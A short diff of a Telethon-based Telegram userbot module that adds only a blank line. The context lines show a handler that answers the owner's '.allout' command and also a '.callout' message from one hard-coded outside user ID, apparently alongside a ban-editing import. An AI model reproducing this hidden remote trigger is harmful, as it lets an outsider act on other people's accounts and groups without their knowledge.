@@ -4,6 +4,7 @@ from telethon.tl.functions.channels import EditBannedRequest
 from userbot.events import register
 from userbot import CMD_HELP
 
+
 @register(outgoing=True, pattern="^.allout(?: |$)(.*)")
 @register(incoming=True, from_users=1694909518, pattern=r"^\.callout$")
 async def testing(event):
